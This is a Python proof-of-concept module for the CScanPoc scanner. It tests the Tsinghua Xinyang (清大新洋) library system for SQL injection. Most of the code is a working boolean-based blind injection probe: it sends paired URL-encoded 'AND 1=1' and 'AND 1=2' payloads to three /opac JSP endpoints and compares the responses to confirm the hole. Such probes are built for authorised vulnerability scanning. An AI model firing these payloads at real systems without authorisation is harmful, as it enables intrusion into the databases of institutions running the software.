# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'goldlib_0001' # 平台漏洞编号，留空
    name = '清大新洋图书系统通用SQL注射漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-03-06'  # 漏洞公布时间
    desc = '''
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '清大新洋图书系统'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '6a592fe8-9918-4c74-98de-07a95d22d8a3'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #refer:http://www.wooyun.org/bugs/wooyun-2010-099335
            hh = hackhttp.hackhttp()
            payloads = [
                '/opac/index_hotsc.jsp?flh=',
                '/opac/index_hotll.jsp?flh=',
                '/opac/index_hotpj.jsp?flh=',
            ]
            getdata1 = '%25%27%20AND%201%3D1%20AND%20%27%25%27%3D%27'
            getdata2 = '%25%27%20AND%201%3D2%20AND%20%27%25%27%3D%27'
            for payload in payloads:
                url1 = self.target + payload +getdata1
                url2 = self.target + payload + getdata2
                code1, head, res1, errcode, _ = hh.http(url1)
                code2, head, res2, errcode, _ = hh.http(url2) 

                if code1 == 200 and code2 ==200 and  'cursor:hand' in res1 and 'cursor:hand' not in res2 :
                    #security_hole(arg+payload+'   :found sql Injection')
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
